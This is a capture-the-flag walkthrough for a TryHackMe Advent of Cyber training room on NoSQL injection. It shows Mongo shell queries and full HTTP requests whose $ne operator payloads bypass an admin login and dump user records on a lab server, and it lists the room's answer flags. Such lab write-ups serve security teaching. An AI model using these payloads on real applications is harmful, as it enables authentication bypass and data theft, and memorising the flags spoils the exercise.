# TryHackMe [Advent of Cyber 3](https://tryhackme.com/room/adventofcyber3) Day 7
### References
* Tib3rius. (2021). TryHackMe - Advent of Cyber 3 - Day 7 Walkthrough [YouTube Video]. In YouTube. https://youtu.be/Fmw8ia0sMEc

## Interact with the MongoDB server to find the flag. What is the flag?
```bash
$ ssh thm@10.10.51.12 -p 2222
thm@10.10.51.12 password: tryhackme
thm@mongo-server:~$ mongo
> show databases
admin   0.000GB
config  0.000GB
flagdb  0.000GB
local   0.000GB
> use flagdb
switched to db flagdb
> db.getCollectionNames()
[ "flagColl" ]
> db.flagColl.find()
{ "_id" : ObjectId("618806af0afbc09bdf42bd6a"), "flag" : "THM{8814a5e6662a9763f7df23ee59d944f9}" }
> 
```

**Flag**: `THM{8814a5e6662a9763f7df23ee59d944f9}`
## Can you log into the application that Grinch Enterprise controls as `admin` and retrieve the flag?
* Modified request:
```http
POST /login HTTP/1.1
Host: 10.10.51.12
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.51.12
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.51.12/login
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: connect.sid=s%3An5mfgw2iQV38JdLhHGhJi9pqIuZWZ59L.Ea2JWiFK6QK08nqlNsYtS1tLoWiTsDwq8jQIL5b3CsA
Connection: close

username=admin&password[$ne]=password
```
* `http://10.10.51.12/flag`

**Flag**: `THM{b6b304f5d5834a4d089b570840b467a8}`
## Once you are logged in, use the gift search page to list all usernames that have `guest` roles. What is the flag?
* Modified request:
```http
GET /search?username[$ne]=admin&role=guest HTTP/1.1
Host: 10.10.51.12
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.51.12/search
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: connect.sid=s%3An5mfgw2iQV38JdLhHGhJi9pqIuZWZ59L.Ea2JWiFK6QK08nqlNsYtS1tLoWiTsDwq8jQIL5b3CsA
Connection: close
```

**Flag**: `THM{2ec099f2d602cc4968c5267970be1326}`
## Use the gift search page to perform NoSQL injection and retrieve the `mcskidy` record. What is the details record?
* Modified request:
```http
GET /search?username=mcskidy&role[$ne]=user HTTP/1.1
Host: 10.10.51.12
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.51.12/search?username=mcskidy&role=user
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: connect.sid=s%3An5mfgw2iQV38JdLhHGhJi9pqIuZWZ59L.Ea2JWiFK6QK08nqlNsYtS1tLoWiTsDwq8jQIL5b3CsA
If-None-Match: W/"6e6-qHudxedQgEeOez/PbVUmml7RbVA"
Connection: close
```

**Answer**: `ID:6184f516ef6da50433f100f4:mcskidy:admin`
